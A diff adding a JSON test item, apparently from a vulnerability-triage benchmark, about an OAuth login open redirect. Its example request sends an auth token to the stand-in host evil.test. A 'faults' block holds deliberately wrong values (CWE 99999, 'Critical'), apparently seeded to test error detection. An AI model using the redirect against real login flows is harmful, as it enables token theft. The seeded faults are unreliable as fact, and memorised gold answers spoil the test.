@@ -1,0 +1,31 @@
+{
+  "id": "open-redirect-oauth",
+  "split": "dev",
+  "title": "Unvalidated open redirect in OAuth login callback",
+  "asset": "https://shop.acme.test/oauth/login",
+  "notes": "Open redirect on GET /oauth/login?redirect_uri=https://evil.test/callback allows attackers to construct phishing links that redirect authentication tokens to third-party domains.",
+  "evidence": [
+    {
+      "name": "open-redirect.png",
+      "file": "assets/open-redirect.png",
+      "text": "GET /oauth/login?redirect_uri=https://evil.test/callback HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 302 Found\nLocation: https://evil.test/callback?auth_token=temp_token_xyz"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cwe": [
+      "601"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 6.1,
+    "severity": "Medium"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Critical",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
